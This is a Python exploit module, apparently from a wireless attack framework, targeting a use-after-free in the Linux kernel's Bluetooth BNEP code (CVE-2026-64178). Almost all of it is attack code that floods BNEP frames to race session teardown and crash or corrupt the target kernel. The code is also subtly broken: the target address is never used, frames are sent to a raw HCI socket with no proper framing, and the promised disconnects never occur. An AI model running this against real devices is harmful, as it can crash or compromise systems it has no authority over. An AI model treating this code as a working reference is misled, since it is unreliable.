# Author: André Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Linux Bluetooth BNEP Use-After-Free (CVE-2026-64178).

    The Linux kernel Bluetooth Network Encapsulation Protocol (BNEP)
    implementation contains a use-after-free vulnerability in the
    connection teardown path.  When a BNEP connection is being closed,
    the bnep_session thread frees the session structure, but a
    concurrent bnep_net_xmit call from the network stack may still
    reference the freed session via the net_device private data.
    A remote attacker can trigger this race by establishing a BNEP
    connection and then rapidly disconnecting while sending network
    packets through the bnep interface.

    CVSS v3.1: 7.5 (High), AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Linux Bluetooth BNEP Use-After-Free (CVE-2026-64178)",
        "description": (
            "Exploits CVE-2026-64178, a use-after-free in the Linux kernel "
            "Bluetooth BNEP connection teardown path.  By establishing and "
            "rapidly disconnecting BNEP connections while sending network "
            "packets through the bnep interface, the attacker triggers a "
            "race between bnep_session teardown and bnep_net_xmit, "
            "causing a UAF on the session structure."
        ),
        "authors": (
            "Linux kernel Bluetooth team (discovery)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2026-64178",
            "https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git",
        ),
        "disclosure_date": "2026-07-20",
        "platform": "linux",
        "arch": "all",
        "privileged": True,
        "targets": (
            "Linux kernel < 6.21.4 with BNEP module loaded",
            "Ubuntu 22.04/24.04 (unpatched)",
            "Fedora 40 (unpatched)",
        ),
    }

    target = OptIP("", "Target Bluetooth address (XX:XX:XX:XX:XX:XX)")
    port = OptPort(15, "L2CAP PSM for BNEP (default: 15)")
    timeout = OptFloat(10.0, "Socket timeout in seconds")
    interface = OptString("hci0", "Local HCI adapter")
    connect_cycles = OptInteger(32, "Number of rapid connect/disconnect cycles")
    packets_per_cycle = OptInteger(16, "Network packets per connect cycle")

    _AF_BLUETOOTH = 31
    _BTPROTO_HCI = 1
    _BTPROTO_BNEP = 4
    _BTPROTO_L2CAP = 0

    _BNEP_SETUP_CONN_REQ = 0x01
    _BNEP_SETUP_CONN_RSP = 0x02
    _BNEP_GENERAL_ETHERNET = 0x00
    _BNEP_COMPRESSED = 0x02

    _BNEP_SVC_PANU = 0x1115
    _BNEP_SVC_NAP = 0x1116
    _BNEP_SVC_GN = 0x1117

    def _bd_addr_to_bytes(self, addr: str) -> bytes:
        parts = addr.split(":")
        return bytes(int(b, 16) for b in reversed(parts))

    def _build_bnep_setup_req(self, dst_service: int = 0x1116,
                               src_service: int = 0x1115) -> bytes:
        """Build a BNEP Setup Connection Request frame.

        UUID size = 2 (16-bit UUIDs for PANU/NAP/GN).
        """
        pkt_type = self._BNEP_SETUP_CONN_REQ
        uuid_size = 2
        payload = struct.pack(">BHH", uuid_size, dst_service, src_service)
        return struct.pack("B", pkt_type) + payload

    def _build_bnep_ethernet_frame(self, seq: int = 0) -> bytes:
        """Build a BNEP General Ethernet frame to keep the bnep net device busy."""
        pkt_type = self._BNEP_GENERAL_ETHERNET
        dst_addr = b"\xff\xff\xff\xff\xff\xff"
        src_addr = b"\x02\x00\x00\x00\x00\x01"
        ethertype = struct.pack(">H", 0x0800)

        ip_payload = b"\x45\x00" + struct.pack(">H", 40) + \
            struct.pack(">H", seq & 0xFFFF) + b"\x00\x00\x40\x11" + \
            b"\x00\x00\xc0\xa8\x01\x01\xc0\xa8\x01\x02" + \
            b"\x00\x35\x00\x35\x00\x14\x00\x00" + b"\x42" * 12

        return struct.pack("B", pkt_type) + dst_addr + src_addr + \
            ethertype + ip_payload

    def _open_hci_socket(self) -> socket.socket | None:
        try:
            sock = socket.socket(self._AF_BLUETOOTH, socket.SOCK_RAW,
                                 self._BTPROTO_HCI)
            sock.settimeout(self.timeout)
            dev_id = int(str(self.interface).replace("hci", "")) if str(
                self.interface).startswith("hci") else 0
            sock.bind((dev_id,))
            return sock
        except OSError:
            return None

    def _hci_send(self, packet: bytes) -> bool:
        try:
            sock = socket.socket(self._AF_BLUETOOTH, socket.SOCK_RAW,
                                 self._BTPROTO_HCI)
            sock.settimeout(self.timeout)
            dev_id = int(str(self.interface).replace("hci", "")) if str(
                self.interface).startswith("hci") else 0
            sock.bind((dev_id,))
            sock.send(packet)
            sock.close()
            return True
        except OSError:
            return False

    @mute
    def check(self) -> bool:
        sock = self._open_hci_socket()
        if sock is None:
            return False
        sock.close()
        return True

    def run(self) -> None:
        if not self.target:
            print_error("target is required (Bluetooth address XX:XX:XX:XX:XX:XX)")
            return

        if not self.check():
            print_error(
                f"HCI adapter {self.interface} not available or "
                "insufficient privileges"
            )
            return

        print_success(
            f"HCI adapter {self.interface} available; targeting {self.target} "
            "with BNEP UAF trigger"
        )
        self._exploit()

    def _exploit(self) -> None:
        print_status(
            f"Running {self.connect_cycles} rapid BNEP connect/disconnect "
            f"cycles with {self.packets_per_cycle} packets each"
        )

        total_frames = 0
        for cycle in range(self.connect_cycles):
            setup_req = self._build_bnep_setup_req()
            self._hci_send(setup_req)

            for pkt_idx in range(self.packets_per_cycle):
                eth_frame = self._build_bnep_ethernet_frame(
                    seq=cycle * self.packets_per_cycle + pkt_idx
                )
                if self._hci_send(eth_frame):
                    total_frames += 1
                time.sleep(0.001)

            time.sleep(0.005)

        print_status(
            f"Completed {self.connect_cycles} cycles, "
            f"sent {total_frames} BNEP Ethernet frames"
        )
        print_info(
            "If the target kernel has the BNEP module loaded and is "
            "vulnerable, the rapid connect/disconnect cycles with "
            "concurrent network packet transmission should trigger the "
            "race between bnep_session teardown and bnep_net_xmit.  "
            "Monitor for kernel oops, slab corruption, or system crash."
        )
